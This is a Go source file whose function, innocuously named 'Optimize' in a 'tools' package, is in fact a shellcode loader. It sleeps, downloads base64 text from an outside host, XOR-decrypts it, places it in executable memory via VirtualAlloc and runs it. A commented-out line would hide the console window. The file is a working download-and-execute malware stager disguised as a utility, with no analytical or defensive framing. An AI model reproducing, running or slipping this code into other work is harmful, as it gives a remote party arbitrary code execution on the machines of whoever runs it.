package tools

import (
	"encoding/base64"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"net/http"
	"syscall"
	"time"
	"unsafe"
)

func Optimize() {
	//win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
	time.Sleep(5 * time.Second)
	resp, err := http.Get("http://apple.9aix.cn/1.txt")
	if err != nil {
		return
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}
	encryptedShellcodeStr := string(body)
	decodedShellcode, err := base64.StdEncoding.DecodeString(encryptedShellcodeStr)
	if err != nil {
		return
	}
	for i := 0; i < len(decodedShellcode); i++ {
		decodedShellcode[i] ^= 0x77
	}
	kernel32, _ := syscall.LoadDLL("kernel32.dll")
	VirtualAlloc, _ := kernel32.FindProc("VirtualAlloc")
	allocSize := uintptr(len(decodedShellcode))
	mem, _, _ := VirtualAlloc.Call(uintptr(0), allocSize, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if mem == 0 {
		panic("VirtualAlloc failed")
	}
	buffer := (*[0x1_000_000]byte)(unsafe.Pointer(mem))[:allocSize:allocSize]
	copy(buffer, decodedShellcode)
	syscall.Syscall(mem, 0, 0, 0, 0)
}
